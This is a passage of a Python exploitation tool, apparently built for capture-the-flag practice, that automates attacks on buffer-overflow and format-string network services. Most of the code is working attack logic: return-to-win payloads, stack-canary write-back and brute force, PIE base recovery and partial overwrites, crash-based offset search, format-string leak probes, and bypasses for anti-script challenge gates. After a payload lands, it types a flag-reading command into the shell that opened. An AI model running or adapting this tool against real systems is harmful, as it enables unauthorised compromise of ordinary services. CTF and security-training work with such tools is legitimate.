#!/usr/bin/env python3
"""Local/authorised CTF assistant for BOF and format-string services.

Stdlib only. No AI, no internet, no pwntools required.
Only connect to hosts/ports you are authorised to test.

Examples:
  python3 auto_pwn.py --host 127.0.0.1 --port 15055 --source buff.c --recon
  python3 auto_pwn.py --host 127.0.0.1 --port 15055 --source buff.c --goal ret2win
  python3 auto_pwn.py --host 127.0.0.1 --port 3312 --source form.c --mode fmt --goal fmt-leak
  python3 auto_pwn.py --host 127.0.0.1 --port 4412 --source genie.c --mode fmt --goal fmt-write
  python3 auto_pwn.py --host 127.0.0.1 --port 15055 --source buff.c --dry-run
"""
import shlex
import argparse
import codecs
import os
import re
import socket
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from analyze import analyze as analyze_path
except Exception:
    analyze_path = None
try:
    from flags import DEFAULT_FLAG_RE, decode_and_find
except Exception:
    # Fallback: catch SIT{...}, WORD{...}, "flag is X", or a long hex token.
    DEFAULT_FLAG_RE = (
        r"(?i)(?:SIT\{[^}]+\}|[A-Za-z][A-Za-z0-9_]{1,15}\{[^}]+\}|"
        r"flag\s*(?:is|=|:)\s*\S+|\b[0-9a-f]{16,64}\b)"
    )
    decode_and_find = None


def esc_bytes(text):
    if text is None:
        return b""
    try:
        return codecs.decode(text, "unicode_escape").encode("latin-1", "ignore")
    except Exception:
        return text.encode("latin-1", "ignore")


def pack_value(value, bits, endian):
    fmt = ("<" if endian == "little" else ">") + ("I" if bits == 32 else "Q")
    return struct.pack(fmt, value & ((1 << bits) - 1))


def unpack_value(data, bits, endian):
    fmt = ("<" if endian == "little" else ">") + ("I" if bits == 32 else "Q")
    size = bits // 8
    if len(data) < size:
        return None
    return struct.unpack(fmt, data[:size])[0]


def recv_idle(sock, timeout=3.0, idle=0.35, max_wait=6.0):
    sock.settimeout(timeout)
    chunks = []
    start = time.time()
    while time.time() - start < max_wait:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not data:
            break
        chunks.append(data)
        sock.settimeout(idle)
    return b"".join(chunks)


def connect(host, port, timeout=4.0):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def extract_addrs(data):
    text = data.decode("latin-1", "replace")
    addrs = []
    for m in re.finditer(r"0x[0-9a-fA-F]{3,16}", text):
        try:
            val = int(m.group(0), 16)
        except ValueError:
            continue
        if val not in addrs:
            addrs.append(val)
    return addrs


def find_flag(data, regex, strong_only=False, drop=b""):
    # Remove the exact bytes we SENT (and their echo) so a flag "found" is never just
    # our own payload bounced back - the held-out set showed 'AAAA...' (0x41 is hex) and
    # leaked hex being reported as flags. `drop` may be a bytes or a list of bytes.
    if drop:
        for d in (drop if isinstance(drop, (list, tuple)) else [drop]):
            if d:
                data = data.replace(d, b"")
    text = data.decode("latin-1", "replace")
    # Try the raw text, then (for format-string leaks) the little-endian-decoded hex.
    if decode_and_find is not None:
        flag, how = decode_and_find(text, regex if regex != DEFAULT_FLAG_RE else None,
                                    strong_only=strong_only)
        if flag:
            return flag, text
        # For the default matcher, decode_and_find (which filters repetitive echo and
        # honours strong_only) is authoritative - do NOT fall back to a raw regex search
        # that would re-match the echoed padding we just rejected.
        if regex == DEFAULT_FLAG_RE:
            return None, text
    m = re.search(regex, text)      # explicit --flag-regex only
    return (m.group(0) if m else None), text


def printable(text):
    return "".join(ch if 32 <= ord(ch) < 127 or ch in "\r\n\t" else "." for ch in text)


def _wait_for(sock, needle, timeout, idle):
    """Read until `needle` appears (or the service goes quiet). Returns what was read."""
    sock.settimeout(idle)
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            d = sock.recv(4096)
            if not d:
                break
            out += d
            if needle in out:
                break
        except socket.timeout:
            if needle in out or out:
                break
        except OSError:
            break
    return out


SHELL_CMD = "cat flag.txt flag flag* flags/* /home/*/flag* 2>/dev/null"


def shell_followup(s, args, out):
    """win() does not always PRINT the flag - often it is `system("/bin/sh")`, and the
    flag is one `cat` away. A payload that lands there used to be reported as a miss,
    because nothing was ever typed into the shell it had just opened.

    Sent only when the reply carries no flag, and only AFTER that reply was read: stdio
    reads ahead, so a command glued to the payload is swallowed by the dying program's
    buffer and never reaches the shell. If the process is gone the send/recv returns at
    once; if it is alive but not a shell, the line is just one more ignored input."""
    if getattr(args, "no_followup", False):
        return b""
    if find_flag(out, args.flag_regex, strong_only=True)[0]:
        return b""
    try:
        s.sendall((getattr(args, "shell_cmd", None) or SHELL_CMD).encode() + b"\n")
    except OSError:
        return b""
    return recv_idle(s, min(args.timeout, 1.2), args.idle)


def converse(args, payload, make=None, followup=False):
    """Walk a scripted exchange: --talk 'Choice:=1' --talk 'Name:=PAYLOAD'.

    Each step is EXPECT=SEND: wait for EXPECT in the output, then send SEND. The literal
    token PAYLOAD is replaced by the exploit payload. Needed when the vulnerable read is
    behind a menu or a multi-step prompt - a single blind send lands on the wrong read."""
    full = esc_bytes(args.prefix) + payload + esc_bytes(args.suffix)
    s = connect(args.host, args.port, args.timeout)
    out = b""
    try:
        if make is not None:
            # Read the opening banner (until the service goes quiet, not for a fixed
            # window - under load it arrives late and a fixed window misses the secret).
            # The payload itself is NOT built here: a per-connection secret may only be
            # printed part-way through the walk, e.g. a canary revealed inside menu
            # option 2. It is built at the PAYLOAD step below, from everything seen by
            # then.
            out += recv_idle(s, args.timeout, args.idle)
        # Text received since our last send. If the prompt a step waits for is already in
        # it (the banner was read above for a leak), waiting again just burns the whole
        # timeout on every attempt.
        pending = out
        for step in args.talk:
            expect, _, send = step.partition("=")
            if expect and expect.encode() not in pending:
                got = _wait_for(s, expect.encode(), args.timeout, args.idle)
                out += got
            if send == "PAYLOAD":
                if make is not None:
                    # Drain whatever the previous step produced. A step with no EXPECT
                    # does no read, so after `--talk 'Choice:=2' --talk '=PAYLOAD'` the
                    # reply to "2" - which is where a canary revealed inside option 2
                    # appears - had never been read when the payload was built.
                    out += recv_idle(s, min(args.timeout, 1.5), args.idle)
                    built = make(out)      # every byte the service has sent so far
                    if built is None:
                        return out
                    full = esc_bytes(args.prefix) + built + esc_bytes(args.suffix)
                data = full + (b"\n" if args.send_mode == "line" and args.newline else b"")
            else:
                data = esc_bytes(send) + b"\n"
            s.sendall(data)
            pending = b""
            time.sleep(0.1)
        out += recv_idle(s, args.timeout, args.idle)
        if followup:
            out += shell_followup(s, args, out)
    finally:
        s.close()
    return out


ARITH = re.compile(rb"(\d{1,9})\s*([-+*x])\s*(\d{1,9})")
TOKEN_HINT = re.compile(rb"(?:echo|repeat|send|reply(?:\s+with)?|type)\b[^\n]{0,40}?"
                        rb"([0-9a-zA-Z_]{4,32})\s*$", re.I | re.M)
# Services that police their input say so. When they do, the filler byte is the usual
# culprit: every payload here padded with 'A'. Try other bytes rather than assume.
REJECTED = re.compile(rb"reject|not allowed|forbidden|denied|banned|"
                      rb"illegal character|bad character|invalid character|"
                      rb"character detected|not permitted", re.I)
# A crash is not a rejection. "*** stack smashing detected ***" used to match the pattern
# above and trigger a pointless filler switch, burning an attempt on every canary target.
CRASHED = re.compile(rb"stack smashing|smashing detected|segmentation fault|core dumped|"
                     rb"\*\*\* .* \*\*\*", re.I)
FILLERS = (b"A", b"B", b"\x90", b"0", b"a", b"\x41\x42")

NUM_PROMPT = re.compile(rb"(?:how many|number of|size of|length of|how large|how long)"
                        rb"[^\n]{0,40}[?:]\s*$", re.I | re.M)
TOO_FAST = re.compile(rb"too fast|slow down|automated|are you a (?:bot|script)", re.I)


def answer_gate(text):
    """A reply for a live challenge-response gate, or None if this is not one.

    A lecturer who cannot ban scripts can still box them: ask something that must be
    computed from THIS connection. Two cheap gates cover almost all of it - arithmetic
    on fresh numbers, and echoing a fresh nonce. Both are answered by reading, not by
    hardcoding, so the same code handles values it has never seen.
    """
    if not text:
        return None
    tail = text[-400:]
    m = TOKEN_HINT.search(tail)
    if m and b"?" not in tail.split(m.group(1))[-1][:8]:
        tok = m.group(1)
        # A pure decimal "token" is far more likely to be part of a sum; let ARITH win.
        if not tok.isdigit():
            return tok
    # A numeric prompt that must be satisfied before the vulnerable read is reachable
    # ("how many bytes will you send?"). Answer with a plausible size; the point is to get
    # past it, not to be honest. Deliberately narrow so ordinary prompts are left alone.
    if NUM_PROMPT.search(tail) and not ARITH.search(tail):
        return b"64"
    m = ARITH.search(tail)
    if m and (b"?" in tail or re.search(rb"what\s+is|compute|answer|solve", tail, re.I)):
        a, op, b_ = int(m.group(1)), m.group(2), int(m.group(3))
        val = a + b_ if op == b"+" else a - b_ if op == b"-" else a * b_
        return str(val).encode()
    return None


def pass_gates(s, args, text=b"", limit=6):
    if os.environ.get("NO_GATES"):
        return text, False
    """Answer challenge-response gates until a normal prompt is reached.

    Returns (accumulated_text, too_fast) - too_fast means this service rejects input that
    arrives instantly, so the caller should reconnect with a human-ish delay.
    """
    # Judge only what arrived SINCE the last answer. Feeding the accumulated transcript
    # back in makes the first gate match forever: the tail still holds "what is 44 + 62 ?"
    # long after it was answered, so an extra reply gets eaten by the vulnerable read and
    # the program finishes without the payload.
    fresh = text
    for _ in range(limit):
        if TOO_FAST.search(fresh[-200:]):
            return text, True
        reply = answer_gate(fresh)
        if reply is None:
            # Only re-read when NOTHING arrived. This runs on every single attempt, so a
            # blocking read here costs the whole budget: a 1.5s wait x 120 attempts is why
            # live 5002 stopped solving.
            if text:
                return text, False
            more = recv_idle(s, min(args.timeout, 0.4), args.idle)
            if not more:
                return text, False
            text += more
            fresh = more
            continue
        time.sleep(args.gate_delay)
        try:
            s.sendall(reply + b"\n")
        except OSError:
            return text, False
        fresh = recv_idle(s, args.timeout, args.idle)
        text += fresh
        if not fresh:
            return text, False
    return text, False


def send_attempt(args, payload, make=None, followup=False):
    """`make(banner)` lets the payload depend on THIS connection's banner. Required for
    PIE under ASLR and for canaries: both differ on every connect, so a value computed
    from an earlier banner is already stale."""
    if args.talk:
        return converse(args, payload, make=make, followup=followup)
    full = esc_bytes(args.prefix) + payload + esc_bytes(args.suffix)
    if args.send_mode == "line" and args.newline:
        full += b"\n"
    s = connect(args.host, args.port, args.timeout)
    try:
        banner = b""
        if not args.noreceive:
            banner = recv_idle(s, args.timeout, args.idle)
        else:
            time.sleep(0.15)
        # Walk any live challenge-response gates before the payload goes anywhere.
        banner, too_fast = pass_gates(s, args, banner)
        if too_fast:
            s.close()
            args.gate_delay = max(args.gate_delay, 0.35) * 2
            log(args, f"service rejects instant input; retrying with {args.gate_delay:.2f}s delay")
            s = connect(args.host, args.port, args.timeout)
            banner = recv_idle(s, args.timeout, args.idle)
            banner, _ = pass_gates(s, args, banner)
        if make is not None:
            built = make(banner)
            if built is None:
                return banner
            full = esc_bytes(args.prefix) + built + esc_bytes(args.suffix)
            if args.send_mode == "line" and args.newline:
                full += b"\n"
        s.sendall(full)
        out = recv_idle(s, args.timeout, args.idle)
        if followup:
            out += shell_followup(s, args, out)
    finally:
        s.close()
    return banner + out


def log(args, msg):
    if args.verbose:
        print(f"[*] {msg}", file=sys.stderr)
    if args.log:
        with open(args.log, "a", encoding="utf-8") as fh:
            fh.write(msg + "\n")


def sent_bytes(args, payload):
    """The exact bytes put on the wire for `payload` (prefix+payload+suffix, with the
    trailing newline when in line mode), plus the no-newline core - both used to strip
    the echo before flag search."""
    core = esc_bytes(args.prefix) + payload + esc_bytes(args.suffix)
    if args.send_mode == "line" and args.newline:
        return [core + b"\n", core]
    return [core]


LAST_RESPONSE = b""


_BASELINED = False


def learn_banner_flags(args):
    """Once per run: whatever flag-shaped text the bare banner holds is not a flag."""
    global _BASELINED
    if _BASELINED:
        return
    _BASELINED = True
    try:
        import flags as _fl
        new = _fl.learn_ignore(banner_with_gates(args) or b"")
        if new:
            print(f"[*] the service prints flag-shaped text before any input - not a flag, "
                  f"ignored from here on: {', '.join(new[:4])}")
        # The same for the REPLY to a harmless input: "Wrong. Flags look like SIT{example}"
        # is printed whatever is sent, and was reported as the flag in 3 s on a service
        # with no bug. What a plain "x" gets back is not something an exploit earned.
        if not args.dry_run:
            try:
                calm = send_attempt(args, b"x")
            except OSError:
                calm = b""
            new2 = _fl.learn_ignore(calm or b"")
            if _fl.IGNORE_HEX_LENS:
                print(f"[*] the service prints bare hex tokens ({', '.join(str(n) for n in sorted(_fl.IGNORE_HEX_LENS))} "
                      f"digits) without being exploited - a session id or checksum, so that shape is not "
                      f"counted as a flag. If the real flag IS bare hex of that length, pass --flag-regex.")
            if new2:
                # "flag: SIT{x}" and "SIT{x}" are one sighting, not two
                shown = [t for t in new2 if not any(o != t and o in t for o in new2)]
                print(f"[!] DIAGNOSIS: the service answers a HARMLESS input with flag-shaped text: {', '.join(shown[:4])}")
                print("[!] It is not reported as solved, because no exploit earned it - it may be an example.")
                print(f"[!] But if this question is simply 'connect and type anything', your flag is:   {shown[0]}")
    except Exception as exc:                          # noqa: BLE001
        print(f"[!] BUG while reading the banner for decoy flags: {type(exc).__name__}: {exc}")


def report_flag(args, payload, out, label, strong_only=False):
    global LAST_RESPONSE
    learn_banner_flags(args)
    LAST_RESPONSE = out if isinstance(out, (bytes, bytearray)) else LAST_RESPONSE
    # A format-string payload makes the service print raw hex by design, so the bare-hex
    # fallback matcher cannot distinguish a flag from a pointer dump. menufmt32 reported
    # "FLAG (fmt-write pos=1): 804c038080492640" - leaked stack words - while the write
    # had not even landed (`target is 0x00000000`). A false SOLVED is worse than a miss:
    # it stops the search and hands over garbage. Demand a wrapped flag for any payload
    # containing '%', whatever the call site passed.
    pay = payload if isinstance(payload, (bytes, bytearray)) else b""
    if b"%" in pay:
        strong_only = True
    flag, text = find_flag(out, args.flag_regex, strong_only=strong_only,
                           drop=sent_bytes(args, payload))
    if flag:
        # How many flag-shaped strings does this reply hold? Counted BEFORE the headline is
        # printed: someone scanning for the first "[+] FLAG" line copies what is on it, and
        # with a globbing shell that used to be simply the first of a hundred.
        n_more = 0
        try:
            from flags import STRONG_PATTERNS as _SP
            _body = out if isinstance(out, (bytes, bytearray)) else b""
            n_more = len({m.group(0) for m in re.finditer(_SP[1], _body.decode("latin-1", "replace"))} - {flag})
        except Exception:                             # noqa: BLE001
            pass
        if n_more and args.flag_regex in (None, "", DEFAULT_FLAG_RE):
            print(f"[+] FLAG ({label}) - ONE OF {n_more + 1} in this reply, NOT necessarily "
                  f"this challenge's; the full list follows: {flag}")
        else:
            print(f"[+] FLAG ({label}): {flag}")
        try:
            import flags as _fl
            if _fl.LAST_HOW not in ("raw", None):
                print(f"[+] note: the service printed it {_fl.LAST_HOW}; shown here decoded")
        except Exception:                             # noqa: BLE001
            pass
        # A shell command that globs (`cat flag* flags/*`) can print several flags, and
        # the first one is not necessarily this challenge's. Show them all rather than
        # let the first match stand in for the answer.
        try:
            from flags import STRONG_PATTERNS
            body = out if isinstance(out, (bytes, bytearray)) else b""
            for d in sent_bytes(args, pay):
                body = body.replace(d, b"") if d else body
            others = []
            for m in re.finditer(STRONG_PATTERNS[1], body.decode("latin-1", "replace")):
                if m.group(0) != flag and m.group(0) not in others:
                    others.append(m.group(0))
            if others and args.flag_regex in (None, "", DEFAULT_FLAG_RE):
                print(f"[+] {len(others)} more flag-shaped string(s) in the same reply - "
                      f"check which one belongs to THIS challenge:")
                for o in others[:200]:
                    print(f"[+]   {o}")
        except Exception:                             # noqa: BLE001
            pass
        print(f"[+] payload: {payload!r}")
        if args.log:
            log(args, f"[+] FLAG ({label}): {flag} payload={payload!r}")
        return True
    return False


def get_report(args):
    report = {}
    if args.source:
        if not analyze_path:
            print("[!] analyze.py not importable; continuing without source analysis", file=sys.stderr)
        else:
            report = analyze_path(args.source)
    if args.binary:
        if not analyze_path:
            print("[!] analyze.py not importable", file=sys.stderr)
        else:
            brep = analyze_path(args.binary)
            if report:
                report["binary"] = brep
            else:
                report = brep
    return report


def detect_arch(args, report):
    bits, endian = None, None
    brep = report.get("binary") if report.get("binary") else (report if report.get("kind") == "binary" else {})
    if brep:
        bits = brep.get("bits")
        endian = brep.get("endian")
    if args.arch == "amd64":
        bits = 64
    elif args.arch == "i386":
        bits = 32
    if args.endian in ("little", "big"):
        endian = args.endian
    return (bits or 32), (endian or "little")


CANARY_RE = r"canary[^0-9a-fA-FxX]{0,12}(0x[0-9a-fA-F]+)"


def build_with_canary(off, addr, canary_off, canary, bits, endian, win_arg, align, gad):
    """Same chain as build_ret2win, but the canary is written back in place.

    A canary aborts the program only if its value CHANGES. Overflow straight through it
    and put the leaked value back at its own slot; the check then passes and the saved
    return address is still yours."""
    w = 4 if bits == 32 else 8
    mid = off - canary_off - w
    if canary_off < 0 or mid < 0:
        return None
    tail = build_ret2win(0, addr, bits, endian, win_arg, align, gad)
    if tail is None:
        return None
    return b"A" * canary_off + pack_value(canary, bits, endian) + b"A" * mid + tail


def pie_win_addrs(binary, leaked):
    """PIE: recover the load base from one leaked code pointer, then rebase win().

    base = leaked - (that symbol's file offset). We do not know WHICH symbol leaked, so
    try them all and keep only bases that are page-aligned (base & 0xfff == 0) - the
    loader always maps on a page boundary, which makes the right pairing fall out."""
    if not binary or not leaked:
        return []
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        elf = ELF(binary)
    except Exception:
        return []
    if not elf.pie or not elf.win_symbols:
        return []
    bases = []
    for leak in leaked:
        for off in elf.functions.values():
            base = leak - off
            if off and base > 0 and (base & 0xFFF) == 0 and base not in bases:
                bases.append(base)
    out = []
    for base in bases[:4]:
        for w in elf.win_symbols.values():
            a = base + w
            if a not in out:
                out.append(a)
    pie_win_addrs.base = bases[0] if bases else 0      # for rebasing gadgets (see pie_gadgets)
    if out and not getattr(pie_win_addrs, "_quiet", False):
        print(f"[*] PIE: load base {', '.join(hex(b) for b in bases[:4])} from the leak; "
              f"win -> {', '.join(hex(a) for a in out[:4])}")
        pie_win_addrs._quiet = True
    return out


def pie_gadgets(gad):
    """Gadget addresses moved to THIS connection's load base.

    win() was rebased from the leak; the gadgets were not. So on a PIE binary the 64-bit
    alignment retry returned through `ret` at its FILE offset (0x1016) - unmapped memory -
    and the argument chain used an unrebased `pop rdi`. It went unnoticed because the
    development machine's libc does not fault on a misaligned stack, so the plain chain
    always won first. Rebuilt and run on Debian 12, whose libc does, pie64 failed."""
    base = getattr(pie_win_addrs, "base", 0)
    return {k: [a + base for a in v] for k, v in gad.items()} if base else gad


def choose_addresses(args, report, leaked):
    if args.addr:
        return [int(args.addr, 0)], "cli"
    brep = report.get("binary") if report.get("binary") else (report if report.get("kind") == "binary" else {})
    rebased = pie_win_addrs(args.binary, leaked)
    if rebased:
        return rebased, "PIE rebased from leak"
    syms = []
    if brep:
        syms = brep.get("win_addresses") or []
    # An address written on the paper ("win() is at 0x401186"). Stack-range values are a
    # buffer's address, not a place to return to for ret2win, so they are left out here.
    told = [a for a in paper("address") if not (0xF7000000 <= a <= 0xFFFFFFFF or a >= 0x7F0000000000)]
    if syms and not (brep.get("pie")):
        return syms + [a for a in told if a not in syms], "binary-symbol" + (" + paper" if told else "")
    if told:
        return told + [a for a in leaked if looks_like_code(a, args.binary) and a not in told], "paper notes"
    code = [a for a in leaked if looks_like_code(a, args.binary)]
    if code:
        return code, "banner-leak"
    return leaked, "banner-any"


def choose_offsets(args, report):
    if args.offset is not None:
        return [args.offset], "cli"
    offs = []
    if getattr(args, "_cyclic", None) is not None:
        offs = [args._cyclic]
    if report and report.get("offset_candidates"):
        offs = list(report["offset_candidates"][:8])
    # analyze.py yields no offsets for a BINARY, but elftool derives them from the
    # frame (`lea reg,[rbp-0xN]`). Without this every binary challenge blind-scans.
    if getattr(args, "binary", None):
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from elftool import ELF
            for o in ELF(args.binary).report()["ret_offset_candidates"][:8]:
                if o not in offs:
                    offs.append(o)
        except Exception:
            pass
    try:
        import notes as _notes
        told = _notes.offsets_from(_notes.load(), (report or {}).get("bits"))[:28]
    except Exception:                                 # noqa: BLE001
        told = []
    # What the SERVICE says counts like notes: "offset to RIP: 72 bytes" in a banner, or
    # `buffer: 0x7ffc..40` beside `saved RIP: 0x7ffc..68` - the distance is their difference.
    try:
        btxt = (getattr(args, "_banner", b"") or b"").decode("latin-1")
        bf = _notes.parse(btxt) if btxt else []
        said = [f["value"] for f in bf if f["kind"] == "offset"]
        st = sorted({f["value"] for f in bf if f["kind"] == "address"
                     and (0xF7000000 <= f["value"] <= 0xFFFFFFFF or f["value"] >= 0x7F0000000000)})
        said += [b - a for a in st for b in st if 8 <= b - a <= 4096 and (b - a) % 4 == 0]
        said = [o for o in dict.fromkeys(said) if 4 <= o <= 4096][:6]
        if said:
            print(f"[*] offset(s) {said} taken from what the service printed (a stated distance, "
                  f"or the gap between two stack addresses)")
            told = said + [o for o in told if o not in said]
    except Exception:                                 # noqa: BLE001
        pass
    if told:
        # A binary's own frame is better evidence than a size on paper, so analysis stays
        # first when there is one; with no binary the paper is all there is.
        offs = offs + [o for o in told if o not in offs] if offs else told
    args._derived = len(offs)       # how many came from analysis rather than the sweep
    for n in range(args.offset_start, args.offset_end + 1, args.step):
        if n not in offs:
            offs.append(n)
    return offs, "source+scan"


def banner_with_gates(args, timeout=None, idle=None):
    """The banner, with any live gate already answered.

    Three separate places used to read the banner with a bare recv_idle - the initial leak
    probe, the canary probe, and send_attempt. Behind a gate the useful half of the banner
    (a code pointer for PIE, `canary = 0x...`, the real prompt) has not been printed yet,
    so each of them silently judged the wrong text. One helper instead of patching each.
    """
    t = args.timeout if timeout is None else timeout
    i = args.idle if idle is None else idle
    try:
        s = connect(args.host, args.port, t)
    except OSError:
        raise
    try:
        text = b"" if getattr(args, "noreceive", False) else recv_idle(s, t, i)
        if text and answer_gate(text) is not None:
            text, _too_fast = pass_gates(s, args, text)
        # Replay the scripted walk too, stopping before the payload. A secret can be
        # printed part-way through a conversation - menucanary32 reveals its canary only
        # inside menu option 2 - so probing with a bare connection sees the menu and
        # concludes there is no canary. The probe has to walk where the exploit will walk.
        for step in (getattr(args, "talk", None) or []):
            expect, _, send = step.partition("=")
            if send == "PAYLOAD":
                break
            if expect and expect.encode() not in text:
                text += _wait_for(s, expect.encode(), t, i)
            try:
                s.sendall(esc_bytes(send) + b"\n")
            except OSError:
                break
            text += recv_idle(s, min(t, 1.5), i)
        return text
    finally:
        s.close()


def recon(args):
    print(f"[*] recon {args.host}:{args.port}")
    try:
        s = connect(args.host, args.port, args.timeout)
    except OSError as exc:
        print(f"[!] cannot connect: {exc}")
        return 1
    try:
        banner = recv_idle(s, args.timeout, args.idle)
    finally:
        s.close()
    text = banner.decode("latin-1", "replace")
    print("[*] banner:")
    print(printable(text).strip() or "(empty)")
    addrs = extract_addrs(banner)
    if addrs:
        print("[*] leaked addresses:", ", ".join(hex(a) for a in addrs))
    if args.probe:
        for probe in (b"%p.%p.%p.%p", b"%x.%x.%x.%x"):
            out = send_attempt(args, probe)
            txt = out.decode("latin-1", "replace")
            print(f"[*] probe {probe!r} -> {printable(txt).strip()[:400]}")
            if re.search(r"0x[0-9a-fA-F]{4,}", txt):
                print("[*] format-string response detected")
                break
    return 0


def de_bruijn(length, alphabet=b"abcdefghijklmnopqrstuvwxyz", n=4):
    """Cyclic pattern: every n-byte window is unique, so one leaked window pins the
    offset exactly. Standard de Bruijn construction."""
    a = [0] * (len(alphabet) * n)
    seq = bytearray()

    def db(t, p):
        if len(seq) >= length:
            return
        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    seq.append(alphabet[a[j]])
                    if len(seq) >= length:
                        return
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, len(alphabet)):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return bytes(seq[:length])


def brute_canary(args, bits, canary_off):
    """Recover a stack canary one byte at a time, with no leak.

    Only works when the service FORKS per connection: the child inherits the parent's
    canary, so the same secret is there every time. Overwrite the first k bytes of it and
    the check passes only if all k guesses were right - survival is the oracle. A service
    that exec()s fresh per connection re-rolls the canary and cannot be brute-forced.
    Cost: word_size x 256 connections worst case, about half that on average."""
    size = 4 if bits == 32 else 8
    try:
        base = send_attempt(args, b"A" * 8)
    except OSError as exc:
        print(f"[!] brute-canary: {exc}")
        return None
    marker = base.strip().split(b"\n")[-1] if base.strip() else b""
    if not marker:
        print("[!] brute-canary: no clean-run marker to test survival against")
        return None
    print(f"[*] brute-canary: canary at +{canary_off}, {size} bytes, survival marker {marker[:24]!r}")
    # The marker only means "survived" if it is printed AFTER the canary check. Printed
    # before it ("Received." inside the function), it is there for every guess, and the
    # result used to be "canary = 0x0" in one second. glibc says so when the check fails;
    # that message counts as death whatever else was printed.
    alive = lambda o: marker in o and b"stack smashing detected" not in o
    try:
        two = [alive(send_attempt(args, b"A" * canary_off + bytes([g]))) for g in (0x01, 0x02)]
    except OSError:
        two = [False, False]
    if all(two):
        print("[!] brute-canary: two DIFFERENT first bytes both 'survive' - the marker is printed before "
              "the canary is checked and the service says nothing when the check fails. There is no "
              "signal to brute-force with; the canary has to be LEAKED (a format string, an over-read).")
        return None
    known = b""
    for pos in range(size):
        for guess in range(256):
            payload = b"A" * canary_off + known + bytes([guess])
            try:
                out = send_attempt(args, payload)
            except OSError:
                continue
            if alive(out):
                known += bytes([guess])
                print(f"[*] brute-canary: byte {pos} = {guess:#04x}  ({known.hex()})")
                break
        else:
            print(f"[!] brute-canary: no byte worked at position {pos}; "
                  "the service probably does not fork (canary re-rolled)")
            return None
    val = int.from_bytes(known, "little")
    print(f"[+] brute-canary: canary = {hex(val)}")
    return val


def partial_overwrite(args, report, bits):
    """PIE with NO leak: overwrite only the LOW 2 BYTES of the saved return address.

    An address is base + file_offset, and the loader always maps on a page boundary, so
    the bottom 12 bits are the file offset and never change. Writing 2 bytes leaves one
    unknown nibble - 16 candidates, one of which is right. The upper half of the saved
    address is left untouched, which is exactly why no base is needed."""
    if bits != 32:
        print("[!] partial overwrite: implemented for 32-bit only")
        return 1
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        elf = ELF(args.binary)
    except Exception as exc:
        print(f"[!] partial overwrite needs --binary: {exc}")
        return 1
    if not elf.win_symbols:
        print("[!] partial overwrite: no win-like symbol in the binary")
        return 1
    win_off = sorted(elf.win_symbols.values())[0]
    offs = [args.offset] if args.offset is not None else choose_offsets(args, report)[0][:24]
    # ASLR re-rolls the base on EVERY connection, so a given nibble is not "the" answer -
    # it matches roughly one connection in 16. This is a probabilistic attack: cycle the
    # nibbles and keep going. 128 tries gives ~99.97% odds of at least one hit.
    tries = args.partial_tries
    print(f"[*] partial overwrite: win at file offset {hex(win_off)}; low 12 bits are fixed, "
          f"1 nibble unknown and re-rolled per connection -> up to {tries} tries "
          f"(~{100 * (1 - (15 / 16) ** tries):.1f}% odds)")
    saved_nl, saved_mode = args.newline, args.send_mode
    args.newline = False          # a trailing \n (or gets()'s NUL) would clobber byte 3
    try:
        for off in offs:
            for i in range(tries):
                val = ((i % 16) * 0x1000 + win_off) & 0xFFFF
                payload = b"A" * off + struct.pack("<H", val)
                try:
                    out = send_attempt(args, payload)
                except OSError:
                    continue
                if report_flag(args, payload, out, f"partial off={off} low16={hex(val)} try={i + 1}"):
                    return 0
    finally:
        args.newline, args.send_mode = saved_nl, saved_mode
    print("[!] partial overwrite exhausted. Either the offset is wrong, win is outside the")
    print("    same 64KB as the saved return address, or the sink NUL-terminates (gets()).")
    return 1


def crash_offset(args, lo=1, hi=None):
    """Find the offset with NO leak at all, using survival as the only signal.

    Send A*n and ask one question: did the process finish normally? The clean-exit tail
    (whatever the service prints after returning) disappears as soon as the saved return
    address is corrupted. Binary-search the smallest n that kills it; the offset is n-1.
    Costs ~log2(range) connections - about 9 - so it also survives rate limiting."""
    hi = hi or args.offset_end
    try:
        base = send_attempt(args, b"A" * 8)
    except OSError as exc:
        print(f"[!] crash-oracle: {exc}")
        return None
    tail = base.strip().split(b"\n")[-1] if base.strip() else b""
    if not tail:
        print("[!] crash-oracle: the service prints nothing on a clean run; no signal to use")
        return None
    print(f"[*] crash-oracle: clean-run marker {tail[:40]!r}")

    def survives(n):
        try:
            return tail in send_attempt(args, b"A" * n)
        except OSError:
            return False

    if survives(hi):
        print(f"[!] crash-oracle: still alive at {hi} bytes; raise --offset-end")
        return None
    while lo < hi:                       # smallest n that does NOT survive
        mid = (lo + hi) // 2
        if survives(mid):
            lo = mid + 1
        else:
            hi = mid
    off = lo - 1
    # This is a LOWER BOUND, not the answer: the first byte that breaks a clean exit is
    # often a clobbered saved register, not the saved return address (measured: dies at
    # 68, real offset 76). Use it to narrow the search instead of trusting it outright.
    print(f"[+] crash-oracle: first damage at {lo} bytes -> offset is >= {off}")
    # "Damage" means the clean ending disappeared. A crash prints nothing in its place; a
    # service that REFUSES long input prints something ("Too long - rejected."). Keep what
    # it said, so the diagnosis does not call a length check a stack overflow.
    try:
        hurt = send_attempt(args, b"A" * lo)
        seen = {l.strip() for l in base.split(b"\n")}
        said = [l.strip() for l in hurt.split(b"\n")
                if l.strip() and l.strip() not in seen and b"AAAAAAAA" not in l
                # a prompt left hanging ("Say:" where the clean run had "Say: bye") is a
                # FRAGMENT of clean output, not something new the service said
                and not any(l.strip() in k for k in seen)
                and not any(k in l.strip() for k in seen if len(k) > 8)]
        args._crash_said = b" / ".join(said)[:120].decode("latin-1", "replace") if said else ""
        if args._crash_said:
            print(f"[*] crash-oracle: at {lo} bytes the service does not go silent, it says: {args._crash_said!r}")
    except OSError:
        args._crash_said = ""
    return off


def cyclic_offset(args, bits, endian):
    """Find the offset to the saved return address in ONE connection.

    Send a cyclic pattern; whatever lands in the return slot is a unique window of it.
    Services that print the saved return address (common in teaching challenges) hand it
    straight back. This is the answer to a rate-limited service, where a 127-connection
